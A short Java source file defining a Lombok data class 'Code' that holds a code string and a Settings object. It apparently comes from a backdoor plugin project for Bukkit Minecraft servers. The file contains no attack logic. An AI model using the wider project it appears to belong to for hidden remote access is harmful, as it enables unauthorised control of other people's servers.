package com.balugaq.bukkitbackdoor.api.code;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

import javax.annotation.ParametersAreNonnullByDefault;

@Data
@ParametersAreNonnullByDefault
@NoArgsConstructor
@AllArgsConstructor
public class Code {
    private String code = ";";
    private Settings settings = new Settings();
}
